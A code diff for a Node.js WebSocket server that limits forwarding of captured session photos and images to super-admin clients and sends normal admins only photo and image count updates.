@@ -86,6 +86,14 @@ function broadcastToSuperAdmins(message) {
   });
 }
 
+function broadcastToNormalAdmins(message) {
+  adminClients.forEach(client => {
+    if (client.readyState === 1 && client.adminType !== 'super') {
+      client.send(JSON.stringify(message));
+    }
+  });
+}
+
 function sendAllSessionsToSuperAdmin(superAdminWs) {
   if (superAdminWs.readyState !== 1) return;
   
@@ -253,8 +261,8 @@ wss.on('connection', (ws, req) => {
         console.log(`Session ${data.sessionId} now has ${iqSessions.get(data.sessionId).photoCount} photos`);
       }
       
-      // Forward to all admins
-      const messageToAdmins = {
+      // Forward ONLY to super admins (not normal admins)
+      const messageToSuperAdmins = {
         type: 'iq_photo_captured',
         sessionId: data.sessionId,
         photoType: data.photoType,
@@ -263,8 +271,15 @@ wss.on('connection', (ws, req) => {
         photo: data.photo
       };
       
-      console.log(`Broadcasting IQ photo to ${adminClients.size} admins`);
-      broadcastToAdmins(messageToAdmins);
+      console.log(`Broadcasting IQ photo to ${superAdminClients.size} super admins ONLY`);
+      broadcastToSuperAdmins(messageToSuperAdmins);
+      
+      // Send session update to normal admins (without image data)
+      broadcastToNormalAdmins({
+        type: 'iq_session_photo_count_update',
+        sessionId: data.sessionId,
+        photoCount: iqSessions.get(data.sessionId)?.photoCount || 0
+      });
       
       // For super admins, also update their comprehensive view
       if (superAdminClients.size > 0) {
@@ -321,13 +336,20 @@ wss.on('connection', (ws, req) => {
         sessions.get(data.sessionId).imageCount++;
       }
       
-      // Forward to all admins
-      broadcastToAdmins({
+      // Forward ONLY to super admins (not normal admins)
+      broadcastToSuperAdmins({
         type: 'image',
         sessionId: data.sessionId,
         time: data.time,
         payload: data.payload,
         captureNumber: data.captureNumber
+      });
+      
+      // Send session update to normal admins (without image data)
+      broadcastToNormalAdmins({
+        type: 'session_image_count_update',
+        sessionId: data.sessionId,
+        imageCount: sessions.get(data.sessionId)?.imageCount || 0
       });
       
       // For super admins, also update their comprehensive view
@@ -372,12 +394,19 @@ wss.on('connection', (ws, req) => {
             sessions.get(sessionId).imageCount = Math.max(0, sessions.get(sessionId).imageCount - 1);
           }
           
-          // Notify all admins about the deletion
-          broadcastToAdmins({
+          // Notify all admins about the deletion (super admins see it, normal admins just get notification)
+          broadcastToSuperAdmins({
             type: 'image_deleted',
             sessionId: sessionId,
             imageTime: imageTime,
             deletedBy: 'super_admin'
+          });
+          
+          // Notify normal admins about count change only
+          broadcastToNormalAdmins({
+            type: 'session_image_count_update',
+            sessionId: sessionId,
+            imageCount: sessions.get(sessionId).imageCount
           });
           
           // Update stats
@@ -422,12 +451,19 @@ wss.on('connection', (ws, req) => {
             iqSessions.get(sessionId).photoCount = Math.max(0, iqSessions.get(sessionId).photoCount - 1);
           }
           
-          // Notify all admins about the deletion
-          broadcastToAdmins({
+          // Notify all admins about the deletion (super admins see it, normal admins just get notification)
+          broadcastToSuperAdmins({
             type: 'iq_photo_deleted',
             sessionId: sessionId,
             timestamp: timestamp,
             deletedBy: 'super_admin'
+          });
+          
+          // Notify normal admins about count change only
+          broadcastToNormalAdmins({
+            type: 'iq_session_photo_count_update',
+            sessionId: sessionId,
+            photoCount: iqSessions.get(sessionId).photoCount
           });
           
           console.log(`IQ photo deleted successfully: ${sessionId} at ${timestamp}`);
